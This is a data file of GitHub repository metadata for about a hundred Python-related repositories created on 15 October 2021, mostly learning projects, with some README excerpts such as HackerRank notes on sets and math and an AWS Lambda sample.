417523966;POO-python;https://github.com/smaillos/POO-python;Python;2021-10-15T14:12:31Z;0;0;0;POO-python 
417489456;tugas-python;https://github.com/Rizky1408/tugas-python;;2021-10-15T12:20:50Z;0;0;0;
417500387;python-pendu;https://github.com/amiraydin/python-pendu;Python;2021-10-15T12:59:01Z;0;0;0;
417468805;CursoPython;https://github.com/vdalmora/CursoPython;Python;2021-10-15T11:05:17Z;0;0;0;
417463186;Python_Practice;https://github.com/Ilmi-Tabassum/Python_Practice;Jupyter Notebook;2021-10-15T10:44:12Z;0;0;0;
417437909;Python_projects;https://github.com/chuene-99/Python_projects;Python;2021-10-15T09:11:48Z;0;0;0;"Python_projects Some of the scripts I've written in python mostly related to the ""python for everybody specialisation"". "
417440762;Mini-Python;https://github.com/dhmhgreCompilers1/Mini-Python;C++;2021-10-15T09:21:46Z;0;0;0;
417422191;python-workspace;https://github.com/CarlosPimentel10/python-workspace;Python;2021-10-15T08:19:39Z;0;0;0;
417449309;Project-Python;https://github.com/Amrutha234/Project-Python;;2021-10-15T09:52:14Z;0;0;0;
417493935;materials_python;https://github.com/linguadev/materials_python;Python;2021-10-15T12:36:46Z;1;1;0;materials_python Educational Repository. 
417468251;zPython;https://github.com/Valdemarr/zPython;Python;2021-10-15T11:03:01Z;0;0;0;
417519752;LearnPython;https://github.com/RemyaGeorge54/LearnPython;Python;2021-10-15T14:00:37Z;0;0;0;LearnPython LearningPython This is a code base created for studying Python  Update readme - Done Update PR format setup a folder structure Add pytest Add coverage  
417453791;Python-practice;https://github.com/umar-faroooq/Python-practice;;2021-10-15T10:08:10Z;0;0;0;Python-practice This Repository contains codes related to python practise 
417504159;python-chatapp;https://github.com/metikulos/python-chatapp;JavaScript;2021-10-15T13:11:11Z;0;0;0;python-chatapp This is a demo of a real-time chat widget powered by Python and Pusher Channels. You can read about how it was created on Pusher's blog. Getting Started These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. Prerequisites What things you need to install the software.  Git. Python. Pip.  Install Clone the git repository on your computer or download the entire repository as a zip file and unpack in on your computer if you do not have git After cloning the application, you need to install its dependencies.  $ cd ...  $ pip install requirements.txt Setup  To set the application in development environment, run the following code  $ export FLASK_ENV=development  Run the application  $ python app.py Built With  Pusher - Hosted APIs to build realtime apps with less code Python - a programming language that lets you work quickly and integrate systems more effectively Flask - a microframework for Python based on Werkzeug, Jinja 2 and good intentions  
417524865;docker_python;https://github.com/mauDelgado101/docker_python;;2021-10-15T14:15:12Z;0;0;0;
417480970;Estudos-Python;https://github.com/SharpBluexd/Estudos-Python;Python;2021-10-15T11:50:15Z;0;0;0;
417528488;python-sdk;https://github.com/42di/python-sdk;Python;2021-10-15T14:26:08Z;0;0;0;"42di Python SDK Install pip install git+https://github.com/42di/python-sdk import import di #42di  import pandas_datareader as pdr Init SDK project = di.Project(""42di.cn/<YOUR_USER_ID>/<YOUR_PROJECT_ID>"", ""<YOUR_ACCESS_TOKEN>"") Create table table = project.table(""us_gdp"")  if not table.exists():     table.create()  table.update(""title"", ""US GDP"") Upload data df = pdr.get_data_fred('GDP')  # Update table schema table.update_schema(di.schema(df))  table.put_csv(df) Read data df = t.read()  print(df) "
417518923;python_work;https://github.com/veeram1026/python_work;Python;2021-10-15T13:58:08Z;0;0;0;
417440877;python_koolitus;https://github.com/blimly/python_koolitus;Python;2021-10-15T09:22:12Z;0;0;0;
417479912;python_projects;https://github.com/csjitheash/python_projects;Python;2021-10-15T11:46:31Z;0;0;0;
417476081;python_learning;https://github.com/MariaSparrow/python_learning;;2021-10-15T11:32:12Z;0;0;0;python_learning This is repository with usefull python function for beginners 
417529032;python-scripts;https://github.com/kevintran3/python-scripts;Python;2021-10-15T14:27:51Z;0;0;0;Python script Python script that runs on the command line Description apiAlert.py This script gets currency pair detail from API and generates alerts as output Required modules: argparse json logging sys requests math Usage:    Argument Type Description     -h  --help  show help message   -c  --currency String  Default = ALL input currency pair (e.g. btcusd) ALL to check all pairs   -t  --type String  Default = ALL input check type [pricedev, pricechange, voldev]   ALL to check all types   -d  --deviation Integer input for deviation %    Further improvements:  Move API requests to it own function to minimize repeatition code Improve specific currency input case  Other interesting checks:  Market share deviation: to check if a currency market share has changed in the last 24 hours by more than X% from the total market volume  My approach to solve the task:  Get all definition for each type of check Collect all required data & formular Review API document to find appropriate functions to get those required data  Total consumed time to wrote this script: 3 hours 
417472087;OOPS-Python;https://github.com/shivanxshh/OOPS-Python;Jupyter Notebook;2021-10-15T11:17:09Z;0;0;0;OOPS-Python 
417502774;python_programs;https://github.com/Srinivassan-Ramamurthy/python_programs;Python;2021-10-15T13:06:32Z;0;0;0;
417507573;python_reduction;https://github.com/python237/python_reduction;;2021-10-15T13:22:04Z;0;0;0;
417496817;python-chatbot;https://github.com/Prashant33-py/python-chatbot;Python;2021-10-15T12:46:42Z;0;0;0;
417527910;Python_Sketches;https://github.com/leninesprj/Python_Sketches;Python;2021-10-15T14:24:30Z;0;0;0;Python_Sketches Ejercicios del curso Python Essencial Course de https://openedg.org/ 
417539205;Python-Activity;https://github.com/MOHAMMED0409/Python-Activity;Python;2021-10-15T14:58:51Z;0;0;0;
417514588;Python-OOP;https://github.com/Bhuribhat/Python-OOP;;2021-10-15T13:44:47Z;0;0;0;Python-OOP tutorial of basic OOP in python 
417552552;exercices_python;https://github.com/arbDEVbest/exercices_python;;2021-10-15T15:40:57Z;0;0;0;
417496269;python_practice;https://github.com/keerthana1502/python_practice;Python;2021-10-15T12:44:58Z;0;0;0;
417505243;Python_Tutorial;https://github.com/shubhyc7/Python_Tutorial;;2021-10-15T13:14:36Z;0;0;0;Python_Tutorial 
417495687;Python-Calculator-;https://github.com/JavaHalla/Python-Calculator-;Python;2021-10-15T12:43:05Z;0;0;0;
417551223;python-rimario;https://github.com/AndreaDex/python-rimario;Python;2021-10-15T15:36:21Z;0;0;0;
417453913;python_devops;https://github.com/GHorbel-AhmEd-AMine/python_devops;Python;2021-10-15T10:08:39Z;0;0;0;python_devops #Devops #Python #Test #Flask 
417517805;Python-Sets;https://github.com/skfreego/Python-Sets;Python;2021-10-15T13:54:51Z;0;0;0;"Python-Sets HackerRank Challenges Domain:Python Sub Domain:Sets introduction_to_sets A set is an unordered collection of elements without duplicate entries.  When printed, iterated or converted into a sequence, its elements will appear in an arbitrary order. Example print set() set([]) print set('HackerRank') set(['a', 'c', 'e', 'H', 'k', 'n', 'r', 'R']) print set([1,2,1,2,3,4,5,6,0,9,12,22,3]) set([0, 1, 2, 3, 4, 5, 6, 9, 12, 22]) print set((1,2,3,4,5,5)) set([1, 2, 3, 4, 5]) print set(set(['H','a','c','k','e','r','r','a','n','k'])) set(['a', 'c', 'r', 'e', 'H', 'k', 'n']) print set({'Hacker' : 'DOSHI', 'Rank' : 616 }) set(['Hacker', 'Rank']) print set(enumerate(['H','a','c','k','e','r','r','a','n','k'])) set([(6, 'r'), (7, 'a'), (3, 'k'), (4, 'e'), (5, 'r'), (9, 'k'), (2, 'c'), (0, 'H'), (1, 'a'), (8, 'n')]) Basically, sets are used for membership testing and eliminating duplicate entries. symmetric_difference Objective  Today, we're learning about a new data type: sets. Concept If the inputs are given on one line separated by a character (the delimiter), use split() to get the separate values in the form of a list. The delimiter is space (ascii 32) by default. To specify that comma is the delimiter, use string.split(','). For this challenge, and in general on HackerRank, space will be the delimiter. Usage:   a = raw_input() 5 4 3 2 lis = a.split() print (lis) ['5', '4', '3', '2']   If the list values are all integer types, use the map() method to convert all the strings to integers.   newlis = list(map(int, lis)) print (newlis) [5, 4, 3, 2]   Sets are an unordered collection of unique values. A single set contains values of any immutable data type. CREATING SETS   myset = {1, 2} # Directly assigning values to a set myset = set()  # Initializing a set myset = set(['a', 'b']) # Creating a set from a list myset {'a', 'b'}   MODIFYING SETS Using the add() function:   myset.add('c') myset {'a', 'c', 'b'} myset.add('a') # As 'a' already exists in the set, nothing happens myset.add((5, 4)) myset {'a', 'c', 'b', (5, 4)}   Using the update() function:   myset.update([1, 2, 3, 4]) # update() only works for iterable objects myset {'a', 1, 'c', 'b', 4, 2, (5, 4), 3} myset.update({1, 7, 8}) myset {'a', 1, 'c', 'b', 4, 7, 8, 2, (5, 4), 3} myset.update({1, 6}, [5, 13]) myset {'a', 1, 'c', 'b', 4, 5, 6, 7, 8, 2, (5, 4), 13, 3}   REMOVING ITEMS Both the discard() and remove() functions take a single value as an argument and removes that value from the set. If that value is not present, discard() does nothing, but remove() will raise a KeyError exception.   myset.discard(10) myset {'a', 1, 'c', 'b', 4, 5, 7, 8, 2, 12, (5, 4), 13, 11, 3} myset.remove(13) myset {'a', 1, 'c', 'b', 4, 5, 7, 8, 2, 12, (5, 4), 11, 3}   COMMON SET OPERATIONS Using union(), intersection() and difference() functions.   a = {2, 4, 5, 9} b = {2, 4, 11, 12} a.union(b) # Values which exist in a or b {2, 4, 5, 9, 11, 12} a.intersection(b) # Values which exist in a and b {2, 4} a.difference(b) # Values which exist in a but not in b {9, 5}   The union() and intersection() functions are symmetric methods:   a.union(b) == b.union(a) True a.intersection(b) == b.intersection(a) True a.difference(b) == b.difference(a) False   no_idea! set_add() If we want to add a single element to an existing set, we can use the .add() operation.  It adds the element to the set and returns 'None'. Example    s = set('HackerRank') s.add('H') print s set(['a', 'c', 'e', 'H', 'k', 'n', 'r', 'R']) print s.add('HackerRank') None print s set(['a', 'c', 'e', 'HackerRank', 'H', 'k', 'n', 'r', 'R'])    set_discord()_remove()_pop() .remove(x)  This operation removes element from the set. If element does not exist, it raises a KeyError. The .remove(x) operation returns None. Example    s = set([1, 2, 3, 4, 5, 6, 7, 8, 9]) s.remove(5) print s set([1, 2, 3, 4, 6, 7, 8, 9]) print s.remove(4) None print s set([1, 2, 3, 6, 7, 8, 9]) s.remove(0) KeyError: 0    .discard(x) This operation also removes element from the set. If element does not exist, it does not raise a KeyError. The .discard(x) operation returns None. Example    s = set([1, 2, 3, 4, 5, 6, 7, 8, 9]) s.discard(5) print s set([1, 2, 3, 4, 6, 7, 8, 9]) print s.discard(4) None print s set([1, 2, 3, 6, 7, 8, 9]) s.discard(0) print s set([1, 2, 3, 6, 7, 8, 9])    .pop() This operation removes and return an arbitrary element from the set. If there are no elements to remove, it raises a KeyError. Example    s = set([1]) print s.pop() 1 print s set([]) print s.pop() KeyError: pop from an empty set    set_union()_operation .union() The .union() operator returns the union of a set and the set of elements in an iterable. Sometimes, the | operator is used in place of .union() operator, but it operates only on the set of elements in set. Set is immutable to the .union() operation (or | operation). Example    s = set(""Hacker"") print s.union(""Rank"") set(['a', 'R', 'c', 'r', 'e', 'H', 'k', 'n'])       print s.union(set(['R', 'a', 'n', 'k'])) set(['a', 'R', 'c', 'r', 'e', 'H', 'k', 'n'])       print s.union(['R', 'a', 'n', 'k']) set(['a', 'R', 'c', 'r', 'e', 'H', 'k', 'n'])       print s.union(enumerate(['R', 'a', 'n', 'k'])) set(['a', 'c', 'r', 'e', (1, 'a'), (2, 'n'), 'H', 'k', (3, 'k'), (0, 'R')])       print s.union({""Rank"":1}) set(['a', 'c', 'r', 'e', 'H', 'k', 'Rank'])       s | set(""Rank"") set(['a', 'R', 'c', 'r', 'e', 'H', 'k', 'n'])    set_intersection()_operation The .intersection() operator returns the intersection of a set and the set of elements in an iterable.  Sometimes, the & operator is used in place of the .intersection() operator, but it only operates on the set of elements in set. The set is immutable to the .intersection() operation (or & operation).    s = set(""Hacker"") print s.intersection(""Rank"") set(['a', 'k'])       print s.intersection(set(['R', 'a', 'n', 'k'])) set(['a', 'k'])       print s.intersection(['R', 'a', 'n', 'k']) set(['a', 'k'])       print s.intersection(enumerate(['R', 'a', 'n', 'k'])) set([])       print s.intersection({""Rank"":1}) set([])       s & set(""Rank"") set(['a', 'k'])    set_difference()_operation .difference() The tool .difference() returns a set with all the elements from the set that are not in an iterable. Sometimes the - operator is used in place of the .difference() tool, but it only operates on the set of elements in set. Set is immutable to the .difference() operation (or the - operation).    s = set(""Hacker"") print s.difference(""Rank"") set(['c', 'r', 'e', 'H'])       print s.difference(set(['R', 'a', 'n', 'k'])) set(['c', 'r', 'e', 'H'])       print s.difference(['R', 'a', 'n', 'k']) set(['c', 'r', 'e', 'H'])       print s.difference(enumerate(['R', 'a', 'n', 'k'])) set(['a', 'c', 'r', 'e', 'H', 'k'])       print s.difference({""Rank"":1}) set(['a', 'c', 'e', 'H', 'k', 'r'])       s - set(""Rank"") set(['H', 'c', 'r', 'e'])    set_symmetric_difference()_operation symmetric_difference() The .symmetric_difference() operator returns a set with all the elements that are in the set and the iterable but not both. Sometimes, a ^ operator is used in place of the .symmetric_difference() tool, but it only operates on the set of elements in set. The set is immutable to the .symmetric_difference() operation (or ^ operation).    s = set(""Hacker"") print s.symmetric_difference(""Rank"") set(['c', 'e', 'H', 'n', 'R', 'r'])       print s.symmetric_difference(set(['R', 'a', 'n', 'k'])) set(['c', 'e', 'H', 'n', 'R', 'r'])       print s.symmetric_difference(['R', 'a', 'n', 'k']) set(['c', 'e', 'H', 'n', 'R', 'r'])       print s.symmetric_difference(enumerate(['R', 'a', 'n', 'k'])) set(['a', 'c', 'e', 'H', (0, 'R'), 'r', (2, 'n'), 'k', (1, 'a'), (3, 'k')])       print s.symmetric_difference({""Rank"":1}) set(['a', 'c', 'e', 'H', 'k', 'Rank', 'r'])       s ^ set(""Rank"") set(['c', 'e', 'H', 'n', 'R', 'r'])    set_mutations .update() or |= Update the set by adding elements from an iterable/another set.    H = set(""Hacker"") R = set(""Rank"") H.update(R) print H set(['a', 'c', 'e', 'H', 'k', 'n', 'r', 'R'])    .intersection_update() or &= Update the set by keeping only the elements found in it and an iterable/another set.    H = set(""Hacker"") R = set(""Rank"") H.intersection_update(R) print H set(['a', 'k'])    .difference_update() or -= Update the set by removing elements found in an iterable/another set.    H = set(""Hacker"") R = set(""Rank"") H.difference_update(R) print H set(['c', 'e', 'H', 'r'])    .symmetric_difference_update() or ^= Update the set by only keeping the elements found in either set, but not in both.    H = set(""Hacker"") R = set(""Rank"") H.symmetric_difference_update(R) print H set(['c', 'e', 'H', 'n', 'r', 'R'])    the_captains_room The list of room numbers contains 31 elements. Since K is 5 , there must be 6 groups of families. In the given list, all of the numbers repeat 5 times except for room number 8. Hence, 8 is the Captain's room number. check_subset Set A= {1 2 3 5 6} Set B= {9 8 5 6 3 2 1 4 7} All the elements of set A are elements of set B. Hence, A set is a subset of set B. check_strict_superset Example Set ([1,3,4]) is a strict superset of set ([1,3]). Set ([1,3,4]) is not a strict superset of set ([1,3,4]). Set ([1,3,4]) is not a strict superset of set ([1,3,5]). Innominion_OCT_21_Internship Innomatics Research Labs "
417491758;Python-apps;https://github.com/Ivaylo-Iv/Python-apps;;2021-10-15T12:29:00Z;0;0;0;Python-apps In the repository you can find a lot of useful python based apps. 1. Python network calculator with Tkinter GUI. 
417477210;python-Mantool;https://github.com/IT-MAI/python-Mantool;Jupyter Notebook;2021-10-15T11:36:30Z;0;0;0;     Данный репозиторий содержит домашнее задания по курсу DataScience Присоединиться к выполнению Домашнего задания можно по ссылке  Template репозиторий будет обновляться в течении данного года  Домашнее задания Data Science  Домашнее задание #1 Домашнее задание #2  Python  Самостоятельное задание #1 Самостоятельное задание #2 Самостоятельное задание #3 Самостоятельное задание #4 Самостоятельное задание #5 Самостоятельное задание #6 Самостоятельное задание #7  
417508789;python-exercises;https://github.com/liiskurm/python-exercises;Python;2021-10-15T13:26:01Z;0;0;0;
417538052;docker_python;https://github.com/LuisColin27/docker_python;Python;2021-10-15T14:55:19Z;0;0;0;docker_python Example for Docker Python container 
417556995;python_2021;https://github.com/thanhcntt03k15/python_2021;;2021-10-15T15:55:27Z;0;0;0;
417446263;python-django;https://github.com/HashmitesCodz/python-django;;2021-10-15T09:41:02Z;0;0;0;
417492395;proxy-python;https://github.com/sdsdilqem/proxy-python;Python;2021-10-15T12:31:10Z;0;0;0;
417495655;jarvis-python;https://github.com/thecodenation-ig/jarvis-python;;2021-10-15T12:43:00Z;0;0;0;
417547864;python-uup;https://github.com/luzeadev/python-uup;;2021-10-15T15:25:21Z;0;0;0;
417515163;Python-HIT;https://github.com/HIT-Hokage-Konoha-IV/Python-HIT;Python;2021-10-15T13:46:33Z;0;0;0;
417550892;Python-Projects;https://github.com/hrushi-thorat/Python-Projects;Python;2021-10-15T15:35:18Z;0;0;0;
417511113;python-3;https://github.com/alidebbich/python-3;;2021-10-15T13:33:30Z;0;0;0;python-3 there is some fault 
417515694;python_art;https://github.com/the-main-method/python_art;Python;2021-10-15T13:48:11Z;0;0;0;
417531785;python-package;https://github.com/byYuraGudan/python-package;Python;2021-10-15T14:36:20Z;0;0;0;python-package 
417543533;Python_Projects;https://github.com/wuradairo/Python_Projects;Jupyter Notebook;2021-10-15T15:12:28Z;0;0;0;Python_Projects Coursera linked worknotes 
417507750;contekan-python;https://github.com/rimbadirgantara/contekan-python;Python;2021-10-15T13:22:39Z;0;0;0;contekan-python 
417504544;python-exercises;https://github.com/OttaviaFeletig/python-exercises;Jupyter Notebook;2021-10-15T13:12:23Z;0;0;0;python-exercises learning python link to Google! 
417546060;Python__Tasks;https://github.com/swtoskon/Python__Tasks;Jupyter Notebook;2021-10-15T15:19:45Z;0;0;0;
417538188;python-pytube;https://github.com/jeffbarreto1/python-pytube;Python;2021-10-15T14:55:47Z;0;0;0;python-pytube Baixando vídeos do YouTube com Python/Pytube https://pytube.io/en/latest/ 
417462853;PYTHON_ALROGRITHMS__;https://github.com/nazarkolesnikov57/PYTHON_ALROGRITHMS__;;2021-10-15T10:42:59Z;0;0;0;
417463929;Python-practice;https://github.com/willcross797/Python-practice;;2021-10-15T10:47:15Z;0;0;0;Python-practice 
417465298;python-code;https://github.com/charan-2002/python-code;;2021-10-15T10:52:45Z;0;0;0;
417489011;Python-Turtle;https://github.com/Sonichigo/Python-Turtle;Python;2021-10-15T12:19:18Z;0;0;0;
417449500;Python-programming;https://github.com/Amrutha234/Python-programming;;2021-10-15T09:52:56Z;0;0;0;
417493316;python-lamda;https://github.com/ceschenbach/python-lamda;Python;2021-10-15T12:34:29Z;0;0;0;Welcome to the AWS CodeStar sample web service This sample code helps get you started with a simple Python web service using AWS Lambda and Amazon API Gateway. What's Here This sample includes:  README.md - this file buildspec.yml - this file is used by AWS CodeBuild to package your application for deployment to AWS Lambda index.py - this file contains the sample Python code for the web service template.yml - this file contains the AWS Serverless Application Model (AWS SAM) used by AWS CloudFormation to deploy your application to AWS Lambda and Amazon API Gateway. tests/ - this directory contains unit tests for your application template-configuration.json - this file contains the project ARN with placeholders used for tagging resources with the project ID  Getting Started These directions assume you want to develop on your development environment or a Cloud9 environment. To work on the sample code, you'll need to clone your project's repository to your local computer. If you haven't, do that first. You can find instructions in the AWS CodeStar user guide at https://docs.aws.amazon.com/codestar/latest/userguide/getting-started.html#clone-repo.   Create a Python virtual environment. This virtual environment allows you to isolate this project and install any packages you need without affecting the system Python installation. At the terminal, type the following command:  $ virtualenv .venv    Activate the virtual environment:  $ source .venv/bin/activate    Install the SAM CLI. For details see https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/serverless-sam-cli-install.html   Start the development server:  $ sam local start-api -p 8080    Open http://127.0.0.1:8080/ in a web browser to view your service.   What Do I Do Next? If you have checked out a local copy of your repository you can start making changes to the sample code.  We suggest making a small change to index.py first, so you can see how changes pushed to your project's repository are automatically picked up by your project pipeline and deployed to AWS Lambda and Amazon API Gateway. (You can watch the pipeline progress on your AWS CodeStar project dashboard.)Once you've seen how that works, start developing your own code, and have fun! To run your tests locally, go to the root directory of the sample code and run the python -m unittest discover tests command, which AWS CodeBuild also runs through your buildspec.yml file. To test your new code during the release process, modify the existing tests or add tests to the tests directory. AWS CodeBuild will run the tests during the build stage of your project pipeline. You can find the test results in the AWS CodeBuild console. Learn more about AWS CodeBuild and how it builds and tests your application here: https://docs.aws.amazon.com/codebuild/latest/userguide/concepts.html Learn more about AWS Serverless Application Model (AWS SAM) and how it works here: https://github.com/awslabs/serverless-application-model/blob/master/HOWTO.md AWS Lambda Developer Guide: https://docs.aws.amazon.com/lambda/latest/dg/deploying-lambda-apps.html Learn more about AWS CodeStar by reading the user guide, and post questions and comments about AWS CodeStar on our forum. User Guide: https://docs.aws.amazon.com/codestar/latest/userguide/welcome.html Forum: https://forums.aws.amazon.com/forum.jspa?forumID=248 What Should I Do Before Running My Project in Production? AWS recommends you review the security best practices recommended by the framework author of your selected sample application before running it in production. You should also regularly review and apply any available patches or associated security advisories for dependencies used within your application. Best Practices: https://docs.aws.amazon.com/codestar/latest/userguide/best-practices.html?icmpid=docs_acs_rm_sec 
417556121;python_dictionary;https://github.com/ivanurban/python_dictionary;Python;2021-10-15T15:52:26Z;0;0;0;python_dictionary Desktop dictionary app using tkinter Implementing PyDictionary library with tkinter PyDictionary: https://pypi.org/project/PyDictionary/ 
417418227;Rendus_Pythons;https://github.com/GrosBobby/Rendus_Pythons;;2021-10-15T08:06:12Z;0;0;0;Rendus_Pythons 
417451306;python-microservices;https://github.com/haywiregod/python-microservices;VBA;2021-10-15T09:59:23Z;0;0;0;python-microservices Dockerized separte Django and Flask apps Both apps have their own DB and are independent of each other. They both connect with the help of rabbitMQ 
417535525;python-code;https://github.com/sandrajomolvk/python-code;;2021-10-15T14:47:33Z;0;0;0;python-code 
417442054;hallo-python;https://github.com/DimitriAistov/hallo-python;Python;2021-10-15T09:26:19Z;0;0;0;hallo-python 
417522694;python_test;https://github.com/heearth/python_test;;2021-10-15T14:08:45Z;0;0;0;
417431301;Tapmi_Python;https://github.com/V9090/Tapmi_Python;Python;2021-10-15T08:50:09Z;0;0;0;
417505882;python-games;https://github.com/ronynudelman/python-games;;2021-10-15T13:16:37Z;0;0;0;python-games 
417471759;Python-OOPS-;https://github.com/shivanxshh/Python-OOPS-;;2021-10-15T11:15:53Z;0;0;0;
417488287;PytestPython;https://github.com/Prabhatrajput7/PytestPython;HTML;2021-10-15T12:16:35Z;0;0;0;PytestPython 
417473844;python_alg;https://github.com/Theeyecode/python_alg;Python;2021-10-15T11:23:38Z;0;0;0;
417558019;Python-receptury;https://github.com/dawidkoss/Python-receptury;Python;2021-10-15T15:58:43Z;0;0;1;Python - receptury Otwarte rezpozytorium *pełne gotowych receptur 🐍 *ok, ok pracujemy nad jego zapełnieniem 😅  Discord: discord.gg/qvfj8XgV42 🐱‍👤 Ideą jest zebranie receptur pythona czyli fragmentów kodu demonstrujących podstawowe i zaawansowane niuanse składni języka. Receptur zebranych w taki sposób byś mógł skopiować i natychmiast uruchomić interesujący Cię fragment kodu. 
417493074;Python---Fizzbuzz;https://github.com/JavaHalla/Python---Fizzbuzz;Python;2021-10-15T12:33:31Z;0;0;0;
417502888;First-python;https://github.com/QianBAI-cloud/First-python;;2021-10-15T13:06:52Z;0;0;0;First-python the first time using Github by the help or python teacher 
417464670;Useful-Python;https://github.com/aperkins19/Useful-Python;;2021-10-15T10:50:17Z;0;0;0;
417452513;python-hw;https://github.com/aliquid-novi/python-hw;;2021-10-15T10:03:32Z;0;0;0;
417439783;Python-Project;https://github.com/MohammadAasim/Python-Project;Python;2021-10-15T09:18:18Z;0;0;0;Python-Project 
417437595;Python-project;https://github.com/Ajaydev123/Python-project;;2021-10-15T09:10:47Z;0;0;0;
417524517;Python-Go;https://github.com/BluPPT/Python-Go;;2021-10-15T14:14:07Z;0;0;0;
417526403;cadence-python;https://github.com/vytautas-karpavicius/cadence-python;Python;2021-10-15T14:20:00Z;0;0;0;Cadence python example This is a minimal example for Cadence client in python. It generates gRPC bindings and uses them start helloworld Cadence sample. Prerequisites 1. Start Cadence server locally Follow https://github.com/uber/cadence/blob/master/docker/README.md 2. Install Cadence CLI brew install cadence-workflow  More info: https://cadenceworkflow.io/docs/cli/ 3. Register samples domain cadence --domain samples-domain domain register  3. Running helloworld worker You will need to checkout cadence-samples and start helloword worker: git clone git@github.com:uber-common/cadence-samples.git cadence-samples cd cadence-samples make helloworld ./bin/helloworld -m worker  Running the example 1. Setup virtual env source setup-env.sh  2. Run the example make  3. Observe the workflow http://localhost:8088/domains/samples-domain  
417428932;Python_scripts;https://github.com/DarekGlabicki/Python_scripts;Python;2021-10-15T08:42:12Z;0;0;0;Python_scripts Instructions These are come instructions for Python scripting! Local feature This is a feature 
417469199;Python-Programming;https://github.com/howecofe/Python-Programming;Jupyter Notebook;2021-10-15T11:06:39Z;0;0;0;Python-Programming 
417547354;Python-Projects;https://github.com/Gehanmassoud/Python-Projects;Jupyter Notebook;2021-10-15T15:23:45Z;0;0;0;
417538231;Python-Maths;https://github.com/skfreego/Python-Maths;Python;2021-10-15T14:55:54Z;0;0;0;Python Math HackerRank Challenges Domain:Python Sub Domain:Math Polar Coordinates Polar coordinates are an alternative way of representing Cartesian coordinates or Complex Numbers. z = x + yj A complex number z is completely determined by its real part x and imaginary part y Here, j is the imaginary unit. A polar coordinate (r,theta) is completely determined by modulus r and phase angle theta. If we convert complex number z to its polar coordinate, we find: r: Distance from z to origin, i.e., root of (x2 + y2)(squared) theta: Counter clockwise angle measured from the positive x-axis to the line segment that joins z to the origin. Python's cmath module provides access to the mathematical functions for complex numbers. cmath.phase This tool returns the phase of complex number z(also known as the argument of z).    phase(complex(-1.0, 0.0)) 3.1415926535897931 abs This tool returns the modulus (absolute value) of complex number z. abs(complex(-1.0, 0.0)) 1.0    Find Angle MBC ABC is a right triangle, at 90 degree at B. Therefore, angle ABC = 90 degree Point M is the midpoint of hypotenuse AC You are given the lengths AB and  BC. Your task is to find MBC(angle) in degrees. Triangle Quest 2 For example, a palindromic triangle of size 5 is: 1 121 12321 1234321 123454321 You can't take more than two lines. The first line (a for-statement) is already written for you. You have to complete the code using exactly one print statement. Note: Using anything related to strings will give a score of 0. Using more than one for-statement will give a score of 0. Mod Divmod One of the built-in functions of Python is divmod, which takes two arguments a and b and returns a tuple containing the quotient of a/b first and then the remainder a. For example:    print divmod(177,10) (17, 7) Here, the integer division is 177/10 => 17 and the modulo operator is 177%10 => 7.    Power-Mod Power So far, we have only heard of Python's powers. Now, we will witness them! Powers or exponents in Python can be calculated using the built-in power function. Call the power function a^b as shown below:    pow(a,b) or a**b It's also possible to calculate a^b mod m. pow(a,b,m) This is very helpful in computations where you have to print the resultant % mod. Note: Here, a and b can be floats or negatives, but, if a third argument is present, b cannot be negative. Note: Python has a math module that has its own pow(). It takes two arguments and returns a float. Frankly speaking, we will never use math.    Triangle Quest You are given a positive integer N. Print a numerical triangle of height N-1 like the one below: 1 22 333 4444 55555 ...... Can you do it using only arithmetic operations, a single for loop and print statement? Use no more than two lines. The first line (the for statement) is already written for you. You have to complete the print statement. Note: Using anything related to strings will give a score of 0. Integer Come In All Sizes Integers in Python can be as big as the bytes in your machine's memory. There is no limit in size as there is: 2^31-1 (c++ int) or 2^63-1 (C++ long long int). As we know, the result of a^b grows really fast with increasing b. Let's do some calculations on very large integers. 
417495507;Python_exercise;https://github.com/SlaimD123/Python_exercise;Python;2021-10-15T12:42:23Z;1;1;0;Python_exercise Some Python exercises. Record my exercises during studying Python. 
417452516;notatki-python;https://github.com/zig111/notatki-python;;2021-10-15T10:03:33Z;0;0;0;
417525989;Python-Programs;https://github.com/RRahulKrishnan/Python-Programs;;2021-10-15T14:18:36Z;0;0;0;
417531439;python-alpha;https://github.com/Dhruvaraju/python-alpha;;2021-10-15T14:35:21Z;0;0;0;python-alpha 
417465410;python_junk;https://github.com/yyk99/python_junk;Jupyter Notebook;2021-10-15T10:53:12Z;0;0;0;python_junk collection of simple python scripts 
417432159;projetPython;https://github.com/StephenBreizh/projetPython;C;2021-10-15T08:52:58Z;0;0;0;projetPython 
417441275;Python-Notebooks;https://github.com/haminotty21/Python-Notebooks;Jupyter Notebook;2021-10-15T09:23:40Z;0;0;0;Complete-Python-3-Bootcamp Course Files for Complete Python 3 Bootcamp Course on Udemy Copyright by Pierian Data Inc. Get it now for 95% off with the link: https://www.udemy.com/complete-python-bootcamp/?couponCode=COMPLETE_GITHUB Thanks! 
417457493;python-api;https://github.com/mayowa1204/python-api;;2021-10-15T10:22:20Z;0;0;0;python-api 
417510624;2048Python;https://github.com/CodingTarik/2048Python;Python;2021-10-15T13:31:52Z;0;0;0;2048 Python 2048 implemented in Python 2048 Python🎮 This is a game made with knowledge of the Programmiervorkurs of TU Darmstadt. Preview  Clone🔄  We recommend VS Code    Enter the following command to clone $ git clone https://github.com/CodingTarik/2048Python.git   License📜  
417427809;Python-Basics;https://github.com/SaiGanesh0509/Python-Basics;Python;2021-10-15T08:38:33Z;0;0;0;
417431431;HelloPython;https://github.com/stomo0511/HelloPython;Python;2021-10-15T08:50:37Z;0;0;0;
417469714;Django_Python;https://github.com/Bugsfounder/Django_Python;HTML;2021-10-15T11:08:27Z;0;0;0;
417421588;python-samples;https://github.com/Lowton/python-samples;Python;2021-10-15T08:17:29Z;0;0;0;Python samples It's a simple repo with some python samples I want to share. Repo structure Tests - directory with different tests and quiz  multiplication_tables - Knowledge test of multiplication tables  
417424072;Python_GB;https://github.com/A1ekseiX/Python_GB;;2021-10-15T08:26:11Z;0;0;0;Python_GB 
417478265;au_python;https://github.com/mshanturov/au_python;;2021-10-15T11:40:39Z;0;0;0;au_python for lessons 
417537499;DSAinPython;https://github.com/satyam-srivastava/DSAinPython;;2021-10-15T14:53:32Z;0;0;0;Data Structures and Algorithms in Python 
417555825;python-110;https://github.com/Guragam1520/python-110;Python;2021-10-15T15:51:29Z;0;0;0;python-110 
417460764;python-fundamental;https://github.com/fitriaulias/python-fundamental;Python;2021-10-15T10:34:39Z;0;0;0;python-fundamental Part of my learning of python fundamental Do you think it works? 
